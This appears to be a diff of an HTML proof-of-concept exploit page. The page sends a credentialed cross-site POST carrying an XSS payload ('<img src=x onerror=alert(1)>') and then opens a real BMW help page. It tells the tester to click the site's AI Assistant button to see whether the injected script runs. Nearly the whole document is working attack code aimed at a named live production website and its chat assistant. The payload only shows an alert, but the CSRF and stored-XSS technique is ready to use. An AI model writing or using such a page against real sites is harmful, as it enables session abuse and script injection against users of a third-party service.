@@ -1,10 +1,9 @@
 <html>
   <body>
-    <h1>CSRF PoC Loading...</h1>  <!-- Visible text to confirm page loads -->
+    <h1>CSRF PoC Running...</h1>
+    <p>Check Network tab for POST request and Console for logs.</p>
     <script>
-      console.log('Script starting...');  // Check console for this
-      alert('PoC executing! Check Network tab for request.');
-
+      console.log('PoC started at:', new Date().toISOString());
       const payload = '<img src=x onerror=alert(1)>';
       const jsonBody = `{"message":"${payload}"}`;
 
@@ -12,21 +11,20 @@
         method: 'POST',
         mode: 'no-cors',
         credentials: 'include',
-        headers: {
-          'Content-Type': 'text/plain'
-        },
+        headers: { 'Content-Type': 'text/plain' },
         body: jsonBody
       }).then(() => {
-        console.log('Fetch succeeded!');
-        alert('Message sent! Opening BMW page...');
+        console.log('Fetch sent successfully');
+        alert('Payload sent! Opening BMW page...');
       }).catch(error => {
-        console.error('Fetch error:', error);
-        alert('Error sending message: ' + error.message);
+        console.error('Fetch failed:', error);
+        alert('Fetch error: ' + error.message);
       });
 
       setTimeout(() => {
-        console.log('Opening window...');
+        console.log('Opening BMW page...');
         window.open('https://www.bmw.de/de/topics/service-und-zubehoer/hilfe-kontakt.html', '_blank');
+        alert('Opened BMW page. Click the AI Assistant button to check for XSS.');
       }, 1000);
     </script>
   </body>
